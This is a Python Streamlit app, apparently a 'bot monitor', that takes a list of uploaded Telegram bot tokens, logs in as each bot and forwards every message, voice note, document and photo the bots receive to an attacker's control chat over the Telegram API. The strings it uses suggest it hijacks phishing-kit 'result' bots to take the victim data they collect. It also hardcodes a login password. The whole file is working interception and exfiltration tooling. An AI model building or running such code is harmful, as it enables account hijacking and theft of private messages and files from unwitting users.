import streamlit as st
import asyncio
import os
import json
import random
import requests
from telethon import TelegramClient, events

# Configuration
CONFIG_FILE = "config.json"

# Load configuration
def load_config():
    try:
        with open(CONFIG_FILE) as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {
            "api_id": "",
            "api_hash": "",
            "bot_token": "",
            "chat_id": ""
        }

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def generate_random_name():
    vowels = ["a", "e", "i", "o", "u", "p", "s", "t", "v", "x", "q", "r"]
    cons = ["b", "c", "d", "f", "g", "j", "k", "l", "m", "n", "h"]
    postal = ["b", "c", "d", "f", "g", "j", "k", "l", "m", "n", "h"]
    randomNumber = random.randint(5, 8)
    name = "NEW REZULT BOTS"
    for x in range(randomNumber):
        name += random.choice(vowels) + random.choice(cons) + random.choice(postal)
    return name

# Custom CSS
def inject_custom_css():
    st.markdown("""
    <style>
        .main {
            background-color: #0e1117;
            color: white;
        }
        .stButton>button {
            background-color: #4CAF50;
            color: white;
            border-radius: 5px;
            padding: 0.5rem 1rem;
            border: none;
            font-weight: bold;
            transition: all 0.3s;
        }
        .stButton>button:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        .stop-button>button {
            background-color: #f44336 !important;
        }
        .logout-button>button {
            background-color: #ff9800 !important;
        }
        .log-table {
            background-color: #1e1e1e;
            color: white;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .log-entry {
            padding: 8px;
            border-bottom: 1px solid #444;
            font-family: monospace;
        }
        .success-log {
            color: #4CAF50;
        }
        .error-log {
            color: #f44336;
        }
        .info-log {
            color: #2196F3;
        }
        .login-container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            border-radius: 10px;
            background-color: #1e1e1e;
        }
    </style>
    """, unsafe_allow_html=True)

# Login system
def login_page():
    st.markdown("<div class='login-container'>", unsafe_allow_html=True)
    st.title("🔒 Bot Monitor Login")
    
    username = st.text_input("Username")
    password = st.text_input("Password", type="password")
    
    if st.button("Login"):
        if username == "wolf" and password == "firas":
            st.session_state.logged_in = True
            st.rerun()
        else:
            st.error("Invalid credentials")
    
    st.markdown("</div>", unsafe_allow_html=True)

async def run_bot_monitor():
    config = load_config()
    if 'bot_tokens' not in st.session_state or not st.session_state.bot_tokens:
        return
    
    clients = []
    
    for token in st.session_state.bot_tokens:
        try:
            # Session file saved in main directory (no SESSION_DIR)
            session_file = f"session_{token}.session"
            client = TelegramClient(session_file, config['api_id'], config['api_hash'])
            clients.append(client)
            await client.start(bot_token=token)
            st.session_state.logs.append(f'[+] Bot started with token: {token[:10]}...')

            async def event_handler(event):
                try:
                    await event.get_chat()
                    name = event.sender.username or str(event.sender_id)
                    
                    if event.raw_text and len(event.raw_text.strip()) < 10:
                        return

                    if event.voice:
                        voice = await event.download_media(file='voice')
                        url = f"https://api.telegram.org/bot{config['bot_token']}/sendvoice?chat_id={config['chat_id']}"
                        files = {'voice': open(voice, 'rb')}
                        requests.post(url, files=files)
                        st.session_state.logs.append(f'[+] Voice from @{name}')

                    elif event.document:
                        media = await event.download_media(file='file')
                        url = f"https://api.telegram.org/bot{config['bot_token']}/senddocument?chat_id={config['chat_id']}"
                        files = {'document': open(media, 'rb')}
                        requests.post(url, files=files)
                        st.session_state.logs.append(f'[+] Document from @{name}')

                    elif event.media and hasattr(event.media, 'photo'):
                        photo = await event.download_media()
                        url = f"https://api.telegram.org/bot{config['bot_token']}/sendphoto?chat_id={config['chat_id']}"
                        files = {'photo': open(photo, 'rb')}
                        requests.post(url, files=files)
                        st.session_state.logs.append(f'[+] Photo from @{name}')

                    elif event.raw_text not in ['ㅤ', '.', '/start', 'Hashtag : ma9souda', 'ID Message:']:
                        text = event.raw_text.replace('#', '').replace('&', '')
                        url = f"https://api.telegram.org/bot{config['bot_token']}/sendmessage?chat_id={config['chat_id']}&text=FROM BOT : @{name}\n\n{text}"
                        requests.post(url)
                        st.session_state.logs.append(f'[+] Message from @{name}')

                except Exception as e:
                    st.session_state.logs.append(f'[!] Error: {str(e)}')

            client.add_event_handler(event_handler, events.NewMessage)

        except Exception as e:
            st.session_state.logs.append(f'[!] Failed to start bot: {str(e)}')

    st.session_state.logs.append("[+] All bots started successfully")
    while st.session_state.monitor_running:
        await asyncio.sleep(1)

    for client in clients:
        try:
            await client.disconnect()
        except:
            pass

def main_app():
    inject_custom_css()
    
    # Header with logout button
    col1, col2 = st.columns([4, 1])
    col1.title("🤖 Telegram Bot Monitor")
    if col2.button("🚪 Logout", key="logout", help="Click to logout"):
        st.session_state.logged_in = False
        st.session_state.monitor_running = False
        st.rerun()
    st.markdown("---")
    
    # Initialize session state
    if 'logs' not in st.session_state:
        st.session_state.logs = []
    if 'monitor_running' not in st.session_state:
        st.session_state.monitor_running = False
    if 'bot_tokens' not in st.session_state:
        st.session_state.bot_tokens = []
    
    config = load_config()
    
    with st.expander("⚙️ Configuration", expanded=True):
        new_config = {
            "api_id": st.text_input("API ID", value=config['api_id']),
            "api_hash": st.text_input("API Hash", value=config['api_hash'], type="password"),
            "bot_token": st.text_input("Control Bot Token", value=config['bot_token']),
            "chat_id": st.text_input("Control Chat ID", value=config['chat_id'])
        }
        
        if st.button("Save Config"):
            save_config(new_config)
            st.success("Configuration saved!")
    
    uploaded_file = st.file_uploader("📁 Upload Bot Tokens (txt file)", type=["txt"])
    
    if uploaded_file:
        st.session_state.bot_tokens = [x.strip() for x in uploaded_file.getvalue().decode().split('\n') if x.strip()]
        st.session_state.logs.append(f"[+] Loaded {len(st.session_state.bot_tokens)} bot tokens")
    
    col1, col2 = st.columns(2)
    if col1.button("🚀 Start Monitoring", disabled=not st.session_state.bot_tokens or st.session_state.monitor_running):
        st.session_state.monitor_running = True
        st.session_state.monitor_task = asyncio.create_task(run_bot_monitor())
        st.session_state.logs.append("[+] Monitoring started")
    
    if col2.button("🛑 Stop Monitoring", disabled=not st.session_state.monitor_running):
        st.session_state.monitor_running = False
        st.session_state.logs.append("[+] Monitoring stopped")
    
    st.subheader("📜 Activity Log")
    log_container = st.empty()
    
    # Update logs
    if st.session_state.logs:
        log_html = "<div class='log-table'>"
        for log in st.session_state.logs[-20:]:
            log_class = "info-log"
            if "[+]" in log:
                log_class = "success-log"
            elif "[!]" in log:
                log_class = "error-log"
            log_html += f"<div class='log-entry {log_class}'>{log}</div>"
        log_html += "</div>"
        log_container.markdown(log_html, unsafe_allow_html=True)

def app():
    if 'logged_in' not in st.session_state:
        st.session_state.logged_in = False
    
    if st.session_state.logged_in:
        main_app()
    else:
        login_page()

if __name__ == "__main__":
    app()